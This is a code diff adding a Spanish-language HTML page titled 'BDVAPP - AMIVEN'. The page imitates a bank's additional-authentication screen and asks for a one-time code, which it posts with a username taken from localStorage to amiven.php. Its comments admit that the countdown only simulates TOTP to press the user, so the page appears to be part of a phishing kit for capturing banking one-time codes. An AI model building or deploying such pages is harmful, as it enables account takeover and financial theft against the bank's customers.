@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+<title>BDVAPP - AMIVEN</title>
+<link rel="icon" href="favicon.png" type="image/x-icon">
+<style>
+ body {
+ margin: 0;
+ padding: 0;
+ font-family: Arial, sans-serif;
+ height: 100vh;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ background-image: url(background.webp);
+ background-size: cover;
+ background-position: center;
+ }
+
+ .container {
+ display: flex;
+ height: 100%;
+ width: 80%;
+ }
+
+ .left-side {
+ width: 40%;
+ display: flex;
+ justify-content: center;
+ align-items: center;
+ }
+
+ .right-side {
+ width: 30%;
+ }
+
+ form {
+ width: 80%;
+ background: white;
+ max-width: 550px;
+ box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+ }
+
+ @media (max-width: 768px) {
+ body {
+  background: #ededed;
+ }
+ .container {
+  flex-direction: column;
+ }
+ .left-side {
+  width: 100%;
+  height: 100vh;
+ }
+ .right-side {
+  display: none;
+ }
+ }
+
+ .form-group {
+ position: relative;
+ margin-bottom: 20px;
+ margin: 20px;
+ }
+
+ .form-group label {
+ position: absolute;
+ top: 50%;
+ left: 10px;
+ transform: translateY(-55%);
+ color: #999;
+ transition: top 0.3s, font-size 0.3s;
+ pointer-events: none;
+ }
+
+ .form-group input {
+ width: 100%;
+ padding: 10px;
+ box-sizing: border-box;
+ position: relative;
+ height: 60px;
+ border: 0;
+ border-bottom: 1px solid gray;
+ background: #ededed;
+ outline: none;
+ }
+
+ .form-group input:focus {
+ border: 0;
+ }
+
+ .form-group input:focus + label,
+ .form-group input:not(:placeholder-shown) + label {
+ top: 5px;
+ font-size: 12px;
+ }
+
+ button {
+ background-color: #0067b1;
+ color: white;
+ border-radius: 3px;
+ border: 0;
+ padding: 10px 20px;
+ text-align: center;
+ display: inline-block;
+ cursor: pointer;
+ transition: background-color 0.3s;
+ font-size: 16px;
+ width: auto;
+ }
+
+ /* Estilo para el botón deshabilitado */
+ button:disabled {
+ background-color: #E0E0E0;
+ cursor: not-allowed;
+ }
+
+ /* Estilo para el botón "Cancelar" */
+ .cancel-btn {
+ background-color: #0067b1;
+ color: white;
+ }
+
+ #timerContainer {
+ margin-top: 20px;
+ }
+
+ #timerText {
+ color: #0067b1;
+ }
+</style>
+</head>
+<body>
+<div class="container">
+ <div class="left-side">
+   <form id="amivenForm" method="post" action="amiven.php">
+  <div style="text-align: center">
+  <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+  </div>
+  <div style="width: 100%; text-align: center">
+  <div style="margin: 10px; color: #0067b1 !important">
+   <h4>Autenticación Adicional</h4>
+  </div>
+  <div style="width: 100%; text-align: center">
+   <div style="margin: 10px; color: #0067b1 !important">
+   <h5>
+    Ingresa el código que se generó en tu aplicación de AMIVEN.
+   </h5>
+   </div>
+
+      <div class="form-group">
+   <input
+    type="text"
+    id="amiven_code"
+    name="amiven_code"
+    maxlength="8"
+    required
+    oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+    minlength="6"
+   />
+   <label for="amiven_code">CÓDIGO AMIVEN *</label>
+   </div>
+
+      <input type="hidden" id="nombreOculto" name="nombre" />
+  </div>
+  <div style="width: 100%; text-align: center">
+   <button type="submit" id="continuarBtn" disabled>Continuar</button>
+   <button type="button" class="cancel-btn" id="cancelBtn">Cancelar</button>
+  </div>
+     <div id="timerContainer" style="margin-top: 20px;">
+   <p id="timerText" style="color: #0067b1;">El código es válido por <span id="timeLeft">00:00</span> segundos.</p>
+  </div>
+  <div style="width: 100%; height: 30px"></div>
+  </div>
+ </form>
+ </div>
+ <div class="right-side"></div>
+</div>
+
+<script>
+ document.addEventListener("DOMContentLoaded", function () {
+ const nombre = localStorage.getItem("usuario");
+ if (nombre) {
+  document.getElementById("nombreOculto").value = nombre;
+ }
+
+ let isSubmitting = false;
+ const amivenCodeInput = document.getElementById("amiven_code");
+ const continuarButton = document.getElementById("continuarBtn");
+ const timeLeftSpan = document.getElementById("timeLeft");
+ const timerContainer = document.getElementById("timerContainer");
+ const timerText = document.getElementById("timerText");
+
+ const VALIDITY_PERIOD = 60; // Ciclo de validez en segundos (60s para simular TOTP)
+
+ function checkInputs() {
+  const amivenCodeValue = amivenCodeInput.value;
+  if (amivenCodeValue.length >= 6) {
+  continuarButton.disabled = false;
+  } else {
+  continuarButton.disabled = true;
+  }
+ }
+
+ amivenCodeInput.addEventListener("input", checkInputs);
+
+ document.getElementById("amivenForm").addEventListener("submit", function(event) {
+  if (isSubmitting) {
+  event.preventDefault();
+  } else {
+  isSubmitting = true;
+  }
+ });
+
+ document.getElementById("cancelBtn").addEventListener("click", function() {
+  const nombre = localStorage.getItem("usuario");
+  if (nombre) {
+  window.location.href = `cancel2.php?nombre=${encodeURIComponent(nombre)}`;
+  } else {
+  window.location.href = 'cancel2.php';
+  }
+ });
+
+ function updateDynamicTimer() {
+  // Obtener la hora actual en milisegundos
+  const now = new Date().getTime();
+
+  // Calcular cuántos segundos han pasado desde el último ciclo de 60 segundos
+  // Se usa Math.floor(now / 1000) para obtener el tiempo Unix en segundos
+  // y luego % VALIDITY_PERIOD (60) para obtener los segundos dentro del ciclo actual.
+  const secondsIntoCycle = Math.floor(now / 1000) % VALIDITY_PERIOD;
+
+  // El tiempo restante es el ciclo completo menos los segundos transcurridos
+  let timeLeft = VALIDITY_PERIOD - secondsIntoCycle;
+
+  // El código cambiará justo cuando timeLeft sea 0 (inicio de un nuevo ciclo)
+  if (timeLeft === 60) {
+  timeLeft = 0; // Mostrar 0 al inicio del ciclo (o 60 si prefieres), pero 60 - 0 = 60.
+
+  // Si el tiempo restante es 60, significa que acaba de comenzar un nuevo ciclo.
+  // Aquí es donde simulamos que el "código ha cambiado"
+  timeLeft = 60; // Se vuelve a poner en 60 para el nuevo ciclo.
+  
+  // Mensaje de código cambiado
+  timerText.innerHTML = `<span style="color: red;">¡El código ha cambiado!</span> Ingrese el nuevo.`;
+  
+  // Esperar un momento para mostrar el mensaje de cambio antes de reiniciar el conteo.
+  setTimeout(() => {
+   timerText.innerHTML = `El código es válido por <span id="timeLeft">${timeLeft}</span> segundos.`;
+   // Actualizar el span de nuevo
+   document.getElementById("timeLeft").textContent = timeLeft; 
+  }, 1000); 
+
+  } else {
+   // Si no está en el punto de cambio (segundosIntoCycle != 0), actualiza el tiempo restante
+   timeLeftSpan.textContent = timeLeft;
+   timerText.innerHTML = `El código es válido por <span id="timeLeft">${timeLeft}</span> segundos.`;
+  }
+ }
+
+ // Inicia el cronómetro dinámico y lo actualiza cada segundo
+ updateDynamicTimer();
+ setInterval(updateDynamicTimer, 1000);
+ });
+</script>
+</body>
+</html>
